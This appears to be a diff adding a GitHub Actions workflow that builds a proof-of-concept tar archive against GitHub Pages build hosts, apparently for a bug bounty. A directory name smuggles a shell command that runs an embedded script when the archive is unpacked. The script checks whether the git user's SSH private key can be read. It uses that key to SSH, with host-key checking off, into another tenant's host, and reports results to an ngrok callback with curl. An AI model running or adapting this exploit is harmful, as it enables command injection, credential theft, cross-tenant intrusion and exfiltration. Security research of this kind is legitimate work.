@@ -1,0 +1,179 @@
+name: Pages bounded B5 lateral proof
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Create bounded B5 lateral proof tar
+        run: |
+          python3 - <<'PY'
+          import io
+          import tarfile
+
+          directory = 'x\';f(){ /bin/tar -xOf "$4" s|/bin/sh -s -- "$3" "$5";};f \''
+          script = r'''#!/bin/sh
+          version=$1
+          dest=$2
+          nonce='240de7b6ce6104494d5d9755'
+          callback='https://phlegmatized-phototypically-eulalia.ngrok-free.dev/pages-lateral/240de7b6ce6104494d5d9755'
+          target_host='pages-dfs-46b9cb1.azure-eastus.github.net'
+          target='/data/pages/0/07/7c/c1/85357462/4439d8e4f75b996422b1e16eb894395c8b206a92/site'
+          marker="$target/b-owned-e73fa565726a4fc145906eb0.txt"
+          expected='BB_CT_B_OWNER_e73fa565726a4fc145906eb0'
+          expected_sha='c21955acd4cf396e279b296fdf00108d4e3539f579eefabdd84d2be8a1aa4f18'
+          result="$dest/pages-lateral-b5-result-$nonce.txt"
+
+          source_host=$(/bin/hostname 2>/dev/null || printf unknown)
+          case "$source_host" in
+            ''|*[!A-Za-z0-9.-]*) source_host=invalid-hostname ;;
+          esac
+
+          curl_exec=0
+          ssh_exec=0
+          timeout_exec=0
+          key_readable=0
+          self_target=0
+          local_b5=0
+          [ -x /usr/bin/curl ] && curl_exec=1
+          [ -x /usr/bin/ssh ] && ssh_exec=1
+          [ -x /usr/bin/timeout ] && timeout_exec=1
+          [ -r /home/git/.ssh/id_rsa ] && key_readable=1
+          [ "$source_host" = "$target_host" ] && self_target=1
+
+          if [ -d "$target" ] && [ ! -L "$target" ] && \
+             [ -f "$marker" ] && [ ! -L "$marker" ] && [ -r "$marker" ]; then
+            local_actual=$(/bin/cat -- "$marker")
+            local_sha=$(/usr/bin/sha256sum "$marker" 2>/dev/null)
+            local_sha=${local_sha%% *}
+            if [ "$local_actual" = "$expected" ] && [ "$local_sha" = "$expected_sha" ]; then
+              local_b5=1
+            fi
+          fi
+
+          if [ "$curl_exec" = 1 ]; then
+            /usr/bin/curl --proto '=https' --tlsv1.2 --connect-timeout 3 --max-time 6 \
+              --retry 0 -fsS -o /dev/null "$callback/start/$source_host" >/dev/null 2>&1 || :
+          fi
+
+          ssh_attempted=0
+          ssh_rc=na
+          ssh_authenticated=0
+          remote_host=none
+          remote_marker=0
+          remote_user_git=0
+          if [ "$self_target" = 0 ] && [ "$ssh_exec" = 1 ] && \
+             [ "$timeout_exec" = 1 ] && [ "$key_readable" = 1 ]; then
+            ssh_attempted=1
+            remote_output=$(
+              /usr/bin/timeout 10 /usr/bin/ssh -F /dev/null -T \
+                -i /home/git/.ssh/id_rsa \
+                -o BatchMode=yes \
+                -o IdentitiesOnly=yes \
+                -o PreferredAuthentications=publickey \
+                -o PasswordAuthentication=no \
+                -o KbdInteractiveAuthentication=no \
+                -o GSSAPIAuthentication=no \
+                -o StrictHostKeyChecking=no \
+                -o UserKnownHostsFile=/dev/null \
+                -o GlobalKnownHostsFile=/dev/null \
+                -o LogLevel=ERROR \
+                -o ConnectTimeout=4 \
+                -o ConnectionAttempts=1 \
+                -o ServerAliveInterval=2 \
+                -o ServerAliveCountMax=1 \
+                "git@$target_host" /bin/sh -s 2>/dev/null <<'REMOTE'
+          marker='/data/pages/0/07/7c/c1/85357462/4439d8e4f75b996422b1e16eb894395c8b206a92/site/b-owned-e73fa565726a4fc145906eb0.txt'
+          expected='BB_CT_B_OWNER_e73fa565726a4fc145906eb0'
+          expected_sha='c21955acd4cf396e279b296fdf00108d4e3539f579eefabdd84d2be8a1aa4f18'
+          remote_host=$(/bin/hostname 2>/dev/null || printf unknown)
+          marker_ok=0
+          user_git=0
+          if [ -f "$marker" ] && [ ! -L "$marker" ] && [ -r "$marker" ]; then
+            actual=$(/bin/cat -- "$marker")
+            sha=$(/usr/bin/sha256sum "$marker" 2>/dev/null)
+            sha=${sha%% *}
+            if [ "$actual" = "$expected" ] && [ "$sha" = "$expected_sha" ]; then
+              marker_ok=1
+            fi
+          fi
+          [ "$(/usr/bin/id -un 2>/dev/null)" = git ] && user_git=1
+          printf 'BB_CT_LATERAL_V1|%s|%s|%s\n' "$remote_host" "$marker_ok" "$user_git"
+          REMOTE
+            )
+            ssh_rc=$?
+            if [ "$ssh_rc" = 0 ]; then
+              prefix=${remote_output%%|*}
+              remainder=${remote_output#*|}
+              parsed_host=${remainder%%|*}
+              remainder=${remainder#*|}
+              parsed_marker=${remainder%%|*}
+              parsed_user=${remainder#*|}
+              case "$parsed_host" in
+                ''|*[!A-Za-z0-9.-]*) parsed_host=invalid ;;
+              esac
+              case "$parsed_marker" in 0|1) : ;; *) parsed_marker=0 ;; esac
+              case "$parsed_user" in 0|1) : ;; *) parsed_user=0 ;; esac
+              if [ "$prefix" = BB_CT_LATERAL_V1 ] && [ "$parsed_host" != invalid ]; then
+                ssh_authenticated=1
+                remote_host=$parsed_host
+                remote_marker=$parsed_marker
+                remote_user_git=$parsed_user
+              fi
+            fi
+          fi
+
+          {
+            echo CANARY=BB_CT_LATERAL_V1
+            printf 'NONCE=%s\n' "$nonce"
+            printf 'SOURCE_HOSTNAME=%s\n' "$source_host"
+            printf 'SOURCE_DEST=%s\n' "$dest"
+            printf 'FIXED_TARGET_HOST=%s\n' "$target_host"
+            echo FIXED_TARGET_REPOSITORY=singetu0096-ano/pages-cross-tenant-canary-5-20260911
+            printf 'SELF_TARGET=%s\n' "$self_target"
+            printf 'LOCAL_B5_MARKER_MATCH=%s\n' "$local_b5"
+            printf 'SSH_EXECUTABLE=%s\n' "$ssh_exec"
+            printf 'TIMEOUT_EXECUTABLE=%s\n' "$timeout_exec"
+            printf 'GIT_RSA_PRIVATE_KEY_READABLE=%s\n' "$key_readable"
+            printf 'SSH_ATTEMPTED=%s\n' "$ssh_attempted"
+            printf 'SSH_RC=%s\n' "$ssh_rc"
+            printf 'SSH_AUTHENTICATED=%s\n' "$ssh_authenticated"
+            printf 'REMOTE_HOSTNAME=%s\n' "$remote_host"
+            printf 'REMOTE_B5_MARKER_MATCH=%s\n' "$remote_marker"
+            printf 'REMOTE_USER_GIT=%s\n' "$remote_user_git"
+          } > "$result"
+          printf '%s\n' "$version" > "$dest/pages-build-version"
+
+          if [ "$curl_exec" = 1 ]; then
+            finish="$callback/finish/$source_host/self-$self_target/localb5-$local_b5/key-$key_readable/attempt-$ssh_attempted/rc-$ssh_rc/auth-$ssh_authenticated/remote-$remote_host/marker-$remote_marker/usergit-$remote_user_git"
+            /usr/bin/curl --proto '=https' --tlsv1.2 --connect-timeout 3 --max-time 6 \
+              --retry 0 -fsS -o /dev/null "$finish" >/dev/null 2>&1 || :
+          fi
+          '''
+
+          assert len(directory.encode()) == 58
+          assert len(script.encode()) <= 6144
+          directory_header = tarfile.TarInfo(directory)
+          directory_header.type = tarfile.DIRTYPE
+          directory_header.mode = 0o755
+          script_header = tarfile.TarInfo('s')
+          script_header.mode = 0o600
+          script_header.size = len(script.encode())
+          with tarfile.open('pages-lateral-b5.tar', 'w', format=tarfile.USTAR_FORMAT) as archive:
+              archive.addfile(directory_header)
+              archive.addfile(script_header, io.BytesIO(script.encode()))
+          print(f'embedded_script_bytes={len(script.encode())}')
+          PY
+
+      - name: Upload without ZIP wrapping
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          path: pages-lateral-b5.tar
+          archive: false
+          retention-days: 1
